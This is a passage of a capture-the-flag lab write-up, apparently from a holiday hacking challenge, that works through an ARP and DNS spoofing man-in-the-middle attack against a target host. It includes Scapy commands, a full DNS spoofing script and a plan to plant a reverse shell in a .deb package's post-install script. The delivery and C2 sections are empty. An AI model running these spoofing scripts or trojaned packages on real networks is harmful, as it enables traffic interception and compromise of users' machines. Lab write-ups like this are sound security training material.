+<pre><code class="language-python"># python3
+
+&gt;&gt;&gt; broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst='10.6.6.35')
+&gt;&gt;&gt; res = srp(broadcast)
+Begin emission:
+Finished sending 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+&gt;&gt;&gt; res[0][0][1].hwsrc
+'4c:24:57:ab:ed:84'
+</code></pre>
+<p>Next we need out Gateway's MAC:</p>
+<pre><code class="language-python"># python3
+
+&gt;&gt;&gt; broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst='10.6.6.53')
+&gt;&gt;&gt; res = srp(broadcast)
+Begin emission:
+Finished sending 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+&gt;&gt;&gt; res[0][0][1].hwsrc
+'fa:34:41:59:86:52'
+</code></pre>
+<h4 id="step-06">Step 06</h4>
+<p>Then, we can use <a href="https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112">Prasoon Nath's <code>arpspoofer.py</code></a>, albeit modifying it so that it runs on <code>python3.x</code>.</p>
+<pre><code class="language-bash">guest@b7fc447d61f1:~/scripts$ python3 arpspoofer.py 
+Enter Target IP:10.6.6.35
+Enter Gateway IP:10.6.6.53
+Target MAC 4c:24:57:ab:ed:84
+Gateway MAC: fa:34:41:59:86:52
+Sending spoofed ARP responses
+</code></pre>
+<h4 id="step-07">Step 07</h4>
+<p>After running the ARP spoofing script, we are now the MitM and thus can see some DNS requests for something at <code>ftp.osuosl.org</code></p>
+<p><img alt="screenshot of DNS traffic" src="media/dns-req.png" /></p>
+<h4 id="step-08">Step 08</h4>
+<p>We can then do some DNS spoofing to see what's going on, and to maybe deliver a payload to the target.</p>
+<p>Modifying the given <code>dns_resp.py</code> with help from <a href="https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html">this DNS spoofing guide from Dartmouth University</a>:</p>
+<pre><code class="language-python"># dns_resp.py
+
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+
+# Our eth0 IP
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our Mac Addr
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+
+# Gateway IP address (spoofed)
+gateway_ip = '10.6.6.53'
+# Target IP address
+target_ip = '10.6.6.35'
+
+# destination ip we arp spoofed
+ipaddr_we_arp_spoofed = gateway_ip
+
+
+def handle_dns_request(packet):
+    # Need to change mac addresses, Ip Addresses, and ports below.
+    # We also need
+    eth = Ether(src=packet.dst, dst=packet.src)                 # need to replace mac addresses
+    ip  = IP(dst=target_ip, src=gateway_ip)                     # need to replace IP addresses
+    udp = UDP(dport=packet.sport, sport=packet.dport)           # need to replace ports
+    dns = DNS(an=DNSRR(rdata=ipaddr, rrname='ftp.osuosl.org'),
+              ancount=1,
+              id=packet[DNS].id,
+              qd=packet[DNS].qd,
+              qr=1,
+              aa=1)
+    dns_response = eth / ip / udp / dns
+    sendp(dns_response, iface=&quot;eth0&quot;)
+
+
+def main():
+    berkeley_packet_filter = &quot; and &quot;.join( [
+        &quot;udp dst port 53&quot;,                              # dns
+        &quot;udp[10] &amp; 0x80 = 0&quot;,                           # dns request
+        &quot;dst host {}&quot;.format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
+        &quot;ether dst host {}&quot;.format(macaddr)             # our macaddress since we spoofed the ip to our mac
+    ] )
+    # sniff the eth0 int without storing packets in memory and stopping after one dns request
+    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=&quot;eth0&quot;, count=1)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>We can assume that the target is trying to access <code>ftp.osuosl.org</code> either via HTTP (curl, wget, etc.) or FTP. Let's try FTP first.</p>
+<pre><code class="language-bash">guest@0b3c9c30735c:~/scripts$ python3 -m http.server 21
+Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ...
+</code></pre>
+<pre><code class="language-bash">guest@0b3c9c30735c:~/scripts$ ./dns_resp.py 
+.
+Sent 1 packets.
+guest@0b3c9c30735c:~/scripts$ 
+</code></pre>
+<p>Nothing captured. Let's try HTTP.</p>
+<pre><code class="language-bash">guest@0b3c9c30735c:~/scripts$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<pre><code class="language-bash">guest@0b3c9c30735c:~/scripts$ ./dns_resp.py 
+.
+Sent 1 packets.
+guest@0b3c9c30735c:~/scripts$ 
+</code></pre>
+<p>We captured a <code>GET</code> request:</p>
+<pre><code class="language-bash">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.6.6.35 - - [11/Jan/2021 06:15:32] code 404, message File not found
+10.6.6.35 - - [11/Jan/2021 06:15:32] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
+^C
+Keyboard interrupt received, exiting.
+guest@0b3c9c30735c:~/scripts$
+</code></pre>
+<p>Therefore, as the MitM, we can deliver on the target's <code>GET</code> request for <code>/pub/jfrost.backdoor/suriv_amd64.deb</code>. We can modify the <code>.deb</code> files to deliver a payload. We just need to figure out what payload to send and to rename the <code>.deb</code> so that the target gets it.</p>
+<h3 id="weaponization">Weaponization</h3>
+<h4 id="step-09">Step 09</h4>
+<p>Knowing that the target is trying to download a <code>.deb</code>, they will likely try to install it after download. Therefore, our payload should start a reverse shell once the target tries to install the <code>.deb</code>. </p>
+<p>According to <a href="https://askubuntu.com/questions/62534/adding-post-deb-install-scripts">rigved and Cashew</a>, there should be a "postinst shell script located in the debian folder in the source".</p>
+<p>And it turns out that there are hints for this challenge that I completely missed and that <a href="https://www.wannescolman.be/?p=98">this given guide</a> seems extremely useful.</p>
+<h3 id="delivery">Delivery</h3>
+<h3 id="exploitation-installation">Exploitation &amp; Installation</h3>
+<h3 id="c2">C2</h3>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../08-broken-tag-generator/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Objective 08
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../10-defeat-fingerprint-sensor/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Objective 10
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
